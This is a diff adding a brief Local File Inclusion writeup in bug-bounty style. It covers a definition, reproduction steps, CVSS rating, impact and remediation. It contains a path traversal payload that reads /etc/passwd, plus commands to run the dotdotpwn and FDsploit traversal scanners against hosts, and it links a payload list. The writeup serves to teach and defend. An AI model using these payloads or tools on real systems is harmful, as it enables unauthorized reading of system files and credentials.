@@ -1,0 +1,68 @@
+LFI (Local File Inclusion) is a web vulnerability where an attacker can read or include files from the server’s local filesystem due to improper input validation in file/path parameters.
+
+                                                                                          
+                                                                                          Steps To Reproduce
+
+
+
+
+https://example.com/index.php?page=about.php
+https://example.com/index.php?page=../../../../etc/passwd
+
+
+
+git clone https://github.com/wireghoul/dotdotpwn.git
+cd dotdotpwn
+./dotdotpwn.pl -m http -h 10.196.199.13
+
+
+git clone https://github.com/chrispetrou/FDsploit.git
+cd FDsploit
+python fdsploit.py -u "http://testphp.vulnweb.com/artists.php?artist=*" 
+
+
+                                                                                            Payload's
+
+Link : https://github.com/yogsec/LFI-Payloads
+
+
+
+                                                                                             CVSS
+
+
+CVSS v3.x: 7.5 – 9.1
+Severity: High
+Priority: P2
+
+
+
+                                                                                             Impact
+
+
+If an LFI vulnerability exists, an attacker can:
+📄 Read sensitive system files (e.g., /etc/passwd)
+🔐 Access configuration files (DB credentials, API keys)
+🗄️ Leak application source code
+📜 Read server logs
+🔁 Chain LFI with log poisoning to achieve remote code execution
+
+
+
+                                                                                          Remediation
+
+✅ Use allowlist-based file inclusion
+❌ Never include files directly from user input
+🔍 Validate and sanitize file paths
+🚫 Block directory traversal (../)
+📁 Store sensitive files outside web root
+⚙️ Disable dangerous PHP settings: allow_url_include = Off
+                                    allow_url_fopen = Off
+🛡️ Use proper file permissions
+🧪 Regularly test file-handling parameters
+
+
+                                                                                            
+
+                                                                                            
+
+                                                                                            
